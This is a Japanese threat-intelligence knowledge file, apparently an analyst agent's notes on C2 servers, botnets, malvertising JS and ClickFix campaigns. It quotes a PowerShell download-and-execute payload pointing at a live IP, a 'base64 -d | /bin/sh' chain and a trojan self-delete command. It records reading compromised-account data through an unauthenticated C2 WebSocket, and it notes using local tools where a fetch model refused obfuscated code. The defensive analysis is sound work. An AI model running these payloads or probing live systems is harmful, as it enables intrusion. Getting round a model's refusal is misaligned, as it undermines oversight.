# ナレッジ（調査実績から得た知見）

## DDoS-Guard配下のサイト（2026-04-12）
- `furystaff.tech` は Server: ddos-guard を返す
- DDoS-Guard配下のサイトはprobe時にDirect=200が返るため、FortiGateブロックがなければ--tor不要
- ただしDDoS-Guard自体がBot検出を行う場合があり、スクリーンショットがチャレンジページになる可能性あり

## .NET Trojan (msilheracles) の特徴（2026-04-12、dotnet-decompileで確認済み）
- VTタグ: `detect-debug-environment`, `long-sleeps` → アンチデバッグ+遅延実行
- 2段階ローダーパターン: net_launcher.exe → C2から launcher.dll をダウンロード
- Mutex: `Global\net_hrz_mtx`（`cum()`メソッド冒頭で確認）
- DLLドロップ: `%TEMP%\<random>.hrz` にPE DLLを書き出し、`LoadLibraryA` → `GetProcAddress("Init")` で実行
- RAS Tracingレジストリキーを設定（ネットワーク操作の痕跡）
- namespace `pornhub`、メインメソッド `cum()` — 挑発的な命名パターン
- `SelfPostRemove`: `cmd.exe /C "timeout /T 5 /NOBREAK >nul & fsutil file seteof ... & del /F /Q ..."` でゼロフィル後削除
- `KillAllThreadsOfModule`: `CreateToolhelp32Snapshot` → `NtQueryInformationThread` → `TerminateThread` でDLLモジュールのスレッド強制終了
- TLS操作: `LdrpHandleTlsData`シンボル解決、TEB直接操作でTLSセットアップ
- **重要**: Ghidraでは全37関数デコンパイル不可（.NET CIL制限）→ `dotnet-decompile` ツールで完全C#ソース取得に成功

## ドーマント（準備段階）C2サーバーの特徴（2026-04-12）
- `166.1.89.80:80` — ThreatFox: c2/ClickFix/xHamster タグ、HOSTKEY AS395839 (NY)
- **応答パターン**: GET=`ok`(2B) / POST=`block`(5B) の2応答のみ。300+パスを総当たりしても全て同じ
- **nginx catch-all構成**: 拡張子ルーティングで `.php`/`.js`/`.css`/`.png`等は404、それ以外は全てGoバックエンドの catch-all
- **`/index.php`だけ存在**: PHP-FPMルートで唯一200を返す。PUT/DELETE/OPTIONSも受付（catch-allは405）
- **バックエンド特定**: Hostヘッダなしで `400 Bad Request: missing required Host header` → Go net/http
- **SSL**: 自己署名、当日発行、SAN にlink-local IPv6（MACアドレス漏洩: EUI-64形式）
- **条件付き配信なし**: User-Agent(14種)/Referer(xhamster含む6種)/Cookie/XFF/Host全て差分なし → ペイロード未配置の準備段階と判断
- **JARM**: `40d40d40d00000000043d40d40d43d684d61a135bd962c8dd9c541ddbaefa8` (nginx+Go)
- **VT**: 6/94 malicious (BitDefender, CRDF, CyRadar, G-Data, Lionic, MalwareURL)、reputation -11
- **Passive DNS**: dimplecloud.co.uk (2025-05-07、現在は141.98.232.51) → インフラローテーション
- **教訓**: catch-allサーバーではパスブルートフォースは無意味。メソッド差分・拡張子ルーティング・エラーメッセージからサーバー構造を推定する

## Kimwolf Android Botnet（2026-04-13）
- **C2**: `164.92.157.113:25001` — DigitalOcean NL, AS14061
- **ThreatFox**: `apk.kimwolf`, Confidence 100%, Bitsight報告、2026-04-12登録
- **VT IP**: 9/94 malicious, Reputation -12, JARM `15d3fd16d29d29d00042d43d000000fe02290512647416dcf0a400ccbc0b6b`
- **C2インフラ**: 10ノードクラスタ（DigitalOcean 2台 + Linode/Akamai 8台）、全てポート25001
- **C2プロトコル**: 非HTTP（全HTTPメソッドにEOF応答）→ カスタムバイナリプロトコル
- **サンプル**: `libandroid_runtime.so` (SHA256: `e1adf204...`) — ARM32 LE ELF, 2MB, VT 20/76
  - DrWeb: `Android.Kimwolf.109`, MS: `Trojan:Linux/Multiverze!rfn`
  - VTタグ: `sets-process-name`, `detect-debug-environment`
- **機能分類**:
  - **Proxy-as-a-Service**: SOCKS4/5 + HTTPプロキシ（libcurl静的リンク）、C++クラス `ProxySession`
  - **Ethereum RPC**: 9個のETH RPCエンドポイントURL（Tatum, 1RPC, Cloudflare-ETH等）+ `jsonrpc`
  - **NAT Traversal**: `stun.cloudflare.com`
  - **DDoS**: MalwareBazaarタグから確認
  - **Mirai亜種**: タグに`mirai`、UPXパック多数
- **動的解析（VT Sandbox）**:
  - C2通信: `172.239.237.211:25001`, `172.233.61.87:25001`
  - ETH RPC: Cloudflare/Tatum等のEthereumノードにHTTPS接続
  - STUN: `162.159.207.0:3478` (UDP)
  - デバイス情報収集: `getprop ro.product.model/brand/device/manufacturer/serialno`
  - プロセス名偽装: ハッシュ値先頭を削って`/tmp/f204d8d2...`として実行
- **Ghidraデコンパイル成功後の追加発見**:
  - **eth_call**: JSON-RPCリクエスト構築（jsonrpc + method + params配列）→ ETH RPCエンドポイントにHTTPS POST。スマートコントラクトのread呼び出し → C2設定や暗号資産アドレスの取得に使用される可能性
  - 9個のETH RPCエンドポイントは配列として初期化（FUN_0005e55c経由で格納）
  - 完全静的リンク: imports=0, exports=1(entry)、5068関数、10.3MB decompiled C
  - 最頻呼び出し関数: FUN_000d231c (865 callers, likely malloc), FUN_001fdc8c (811 callers, likely free)
- **教訓**:
  - ポート25001がHTTP非応答 → C2は必ずしもHTTPではない。probeのEOFはポートが開いているがプロトコル不一致を示す
  - **Ghidra全関数デコンパイル失敗でエラーメッセージが空の場合**: デコンパイラバイナリの読み取り権限不足(`chmod +x`のみで`+r`がない)が根本原因の可能性大。`chmod +rx`で修正後に5068/5068成功(エラー0)。ARM Thumbプロセッサ設定は無関係だった
  - binary_info.pyの`Endian: Big`表示はJythonの演算子優先順位バグ（`%s` % expr and "A" or "B"が意図通り動かない）
  - MalwareBazaarからのサンプルDLには`ABUSECH_AUTH_KEY`が必須、ZIPはAES-256で7z必要
  - MalwareBazaarのサンプル配布ZIP(password: "infected")はPKZip v5.1 AES暗号化 → Alpine標準unzipでは展開不可
  - MalwareBazaarのダウンロードAPIはContent-Typeが不正確な場合あり → ZIPマジックバイト(PK=0x50,0x4B)で判定する

## ベッティングボットC2パネル "Bot Manager"（2026-04-13）
- **C2**: `89.110.72.206:8080` — VDSINA NL, AS216071 (Servers Tech Fzco)
- **ThreatFox**: `botnet_cc`, Confidence 75%, Tags: `bot-manager`, `botnet`, `panel`, `VDSINA`
- **VT IP**: 9/94 malicious, Reputation -11, PassiveDNS: `v501193.hosted-by-vdsina.com`
- **パネル種別**: 従来のマルウェアbotnetではなく**bet365自動ベッティングボット**管理パネル
- **ボットソフト**: `Bet365Bot` (.NET/C#, Microsoft Playwright), ソースパス `D:\Unity\Projects\Bet365Bot\BrowserWorker.cs`
- **Server**: Microsoft-HTTPAPI/2.0 (Windows Server), 8GB RAM
- **認証**: パスワードのみ（ユーザー名なし）, `POST /api/login` with `{"password":"..."}`
- **最大の発見 — WebSocket認証バイパス**:
  - `/ws` エンドポイントがHTTP 101 Switching Protocolsで認証なし接続を受け入れ
  - HTTP側は全パス302リダイレクト（認証必須）なのにWebSocketだけ認証スキップ
  - 接続直後から全パネルデータをリアルタイムストリーミング:
    - 侵害アカウント情報（メールアドレス、ユーザー名、ベット数、活動状態）
    - システムメトリクス（CPU, RAM, Disk）
    - エラーログ（.NETスタックトレース含む → ソースコードパス漏洩）
    - スキャナーデータ（surebet/アービトラージシグナル）
- **侵害アカウント**: 5件のbet365.com.auアカウント（2件アクティブ、3件Idle）
- **動作フロー**: surebetスキャナー → シグナル検出 → Playwrightブラウザ自動操作 → bet365ログイン+ベット配置
- **偵察テクニック**:
  - 全HTTPパス(API/root-level/拡張子)は302リダイレクト → パスブルートフォース無意味
  - 他ポート全滅、近隣IP応答なし、Wayback/urlscan/Shodan記録なし（新しいため）
  - `/logs` と `/manage` のGETがタイムアウト（他パスは即302） → 実在エンドポイントの手がかり
  - `/ws` WebSocket接続で全データ取得 — **C2偵察ではWebSocketプローブが必須**
- **教訓**:
  - ThreatFoxの`botnet_cc`分類は従来のマルウェアbotnetだけでなく、ベッティングボット等の非マルウェア自動化インフラも含む
  - C2パネルのHTTP認証が堅くても、WebSocketが認証なしのケースがある（開発者の見落とし）
  - Microsoft-HTTPAPI/2.0 + ロシア語UI + VDSINA = ロシア系オペレーター
  - curlだけでWebSocketバイナリフレームをキャプチャ可能（`-H "Upgrade: websocket"` + Sec-WebSocket-Key）
  - WebSocketフレームの手動パース: opcode(4bit) + mask(1bit) + payload_length(7/16/64bit) + payload

## Blackout DDoSボットネット（2026-04-14）
- **C2**: `150.241.65.94` — AS207567 Intezio Worldwide Limited (SE)
- **構成**: Port 3000 (Express/NodeJS管理パネル) + Port 4444 (ボットC2) + Port 80 (`/sc32` ペイロード配布)
- **マルウェア**: `s79bi4pj.exe` (ELF 64bit, Go製, 9.38MB, VT 3/75) — FW全停止+IoTスキャン+サンドボックス回避
- **インフラローテーション**: 同一ASN(AS207567)内で 150.241.65.94→77.239.112.71→150.241.92.133 と移転
- **教訓**:
  - TIMEOUT=FWフィルタリング（裏にサービスあり）、REFUSED=ポート閉鎖（何もない）
  - Passive DNS再帰ピボットで攻撃者の全インフラが見える → `c2-profile`で自動化済み
  - probe並列実行時は `--batch` フラグ必須（exit 2で全キャンセル防止）
  - MalwareBazaarの"BlackOut"は別物（.NETランサムウェア）

## マルバタイジングJSキャッチオールインフラ webcstore.pw（2026-04-14）
- **ドメイン**: `webcstore.pw` — Chrome Web Storeに見せかけた名前
- **IP**: 46.8.9.220-229 (10 IP Round-Robin), AS60592 Gransy s.r.o. (CZ)
- **VT**: 2/94 malicious, マルウェア通信ファイル10件
- **種別**: クリックジャック型広告詐欺（Ad Fraud）
- **ペイロード**: 276Bの固定JS。ユーザーの最初のクリックをcaptureフェーズで横取りし、`planet.news`（AdSenseコンテンツファーム）にリダイレクト
- **キャッチオール特性**: `*.js`の任意パスが同一276Bペイロードを返す。攻撃者は被害サイトごとにファイル名を変えても1つのルーティングルールで対応可能
- **UA判定**: ブラウザUA → 悪性JS返却 / bot UA → 空レスポンスまたはパーキングリダイレクト
- **二面性**: 非JS/非ブラウザリクエスト → `robot.parktons.com`パーキングに302。セキュリティスキャナには期限切れドメインに見える
- **BulletProof Hosting指標**:
  - /23ブロック全体が同一302挙動 + 同一ポート構成 (22/53/80/443)
  - Port 53 OPEN（独自DNSサーバー → テイクダウン耐性）
  - DNSローテーション（同一ドメインが近隣IP間でMIGRATE）
  - POST/PUT/DELETE/PATCHに空200応答（ビーコン受信口の可能性）
  - Let's Encryptワイルドカード証明書
- **同居ドメイン**: フィッシング(gate75.xyz)、GPT投資詐欺、Steamフィッシング、typosquat(lotgin.com)、違法パスポート販売
- **過去のAPI**: `/f/gstats` が2024-03にJSON応答（統計収集エンドポイント、現在は無効化）
- **攻撃チェーン**: サプライチェーン攻撃(JS注入) → クリックジャック → planet.news → Google AdSense収益化
- **教訓**:
  - マルバタイジングサイトはUA判定が標準。bb-tech/bb-headers等のツールもブラウザUAが必須
  - キャッチオール判定: 3つ以上のランダムJSパスで同一レスポンスなら確定
  - パーキングリダイレクトは偽装の可能性あり。JS+ブラウザUAで再検証する
  - `.well-known/*`がapplication/javascriptを返す場合は確実に悪性
  - Wayback Machineで過去のAPIエンドポイントを発見できる（現在無効でも構造把握に有用）
  - 並列Bash実行時は全コマンドに `; true` を付けてexit 0を保証する（タイムアウトによる全キャンセル防止）

## ブロックチェーンRPC C2パターン（2026-04-14、2件で確認）
- **概念**: 攻撃者がスマートコントラクトにC2設定を格納し、公開RPCエンドポイント経由で取得
- **確認事例**:
  - Kimwolf Android Botnet (2026-04-13): 9個のETH RPCエンドポイント（Tatum, 1RPC, Cloudflare-ETH等）
  - bestwebchlen.cyou ClickFix (2026-04-14): 10個のPolygon RPCエンドポイント並列POST
- **攻撃者の利点**: テイクダウン不可能（分散型）、匿名書き込み、正規トラフィックに紛れる、設定更新がトランザクション1つで全ボットに伝播
- **検出方法**: `proxy-web.exe classify` が BLOCKCHAIN_RPC として自動検出。network.csv内のPolygon/ETH/BSC RPCエンドポイントへのPOSTリクエストにフラグ
- **対応チェーン**: Ethereum, Polygon(MATIC), BSC
- **教訓**: ページロード直後の並列RPCリクエストはC2設定取得のサイン。`eth_call`メソッドでスマートコントラクトを読み取り、ウォレットアドレスやC2 URLを動的取得

## ClickFix EXT (ブラウザ拡張機能型) キャンペーン解析（2026-04-15）
- **事例**: `daemonpath.icu` / `signalwarden.icu` — 同一IP(193.233.208.102)、同一SSL証明書
- **特徴**: WordPress侵害サイトに `<script>` タグとして注入される外部JS
- **ファイル構成**:
  - `t.js?=site` / `t.{hash}.js`: アナリティクストラッカー（訪問者ID+Cookie、`/collect`へビーコン）
  - `ext.{hash}.js`: ClickFix本体バリアントA（偽reCAPTCHA→Terminal→RCE）
  - `ext-b.{hash}.js`: ClickFix本体バリアントB（`__abVariant`でA/Bテスト）
- **ターゲット**: macOSデスクトップのみ（`Macintosh` UA判定、iPad/iPhone除外）
- **多言語**: 14言語（en, zh, zh-yue, es, hi, bn, pt, ja, vi, tr, ar, de, ko, fr）
- **攻撃チェーン**: 偽reCAPTCHAオーバーレイ → Command+Space→Terminal→Command+V→Enter → `base64 -d | /bin/sh` → `rm -f` + 偽検証成功
- **WordPress判定**: `a[href*="wp-login.php?action=logout"]` CSSセレクタで判定
- **難読化**: obfuscator.io形式（`_0x` 変数名、Base64文字列配列、整数シフト）
- **検知回避**: VT 0/94、CT未登録、Wayback履歴なし、ルート404、UA判定でbot除外
- **分析手順**:
  1. `probe --batch` でJSペイロードURL生存確認
  2. **`fetch` で生JSを取得**（`proxy-web "URL"` はNG → `<pre>`テキスト表示になる）
  3. `js_deobfuscate.py` でClickFix自動検出+IOC抽出
  4. 侵害先HTMLページは `proxy-web "URL"` でスクリーンショット取得
- **教訓**:
  - JSファイル直接分析にはブラウザレンダリング不要。`fetch`を使う
  - WebFetchの中間モデルは難読化コードの返却を拒否する場合がある → ローカルツール必須
  - 同一キャンペーンのJS同士はハッシュ部分（ファイル名の12桁hex）が一致する → ピボットに使える
  - A/Bテスト（`__abVariant`）を行うマルウェアキャンペーンが存在する

## ClickFix攻撃サイトの解析（2026-04-12）
- `www.mokonol.shop/xamster.html` — xHamster年齢確認ダイアログを偽装したClickFix
- **攻撃フロー**: クリック → フルスクリーン強制 → 偽「ドライバーインストール」プログレスバー → Win+R誘導
- **クリップボード乗っ取り**: `document.addEventListener("click")` → hidden textarea作成 → `execCommand("copy")` でPowerShellコマンドを注入
- **ペイロード**: `iex([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('...')))` → `Invoke-WebRequest 'http://103.27.156.239/_/' -UseBasicParsing | Invoke-Expression`
- **防御テクニック**: キーボード入力ブロック（Esc/F5/F12/Alt/Tab）、`beforeunload`でタブ離脱妨害、favicon除去
- **解析のポイント**: `inline_0.js`にペイロード、`inline_2.js`にUI制御ロジック、`clipboard_captured.json`で実際のクリップボード書き込み値を確認
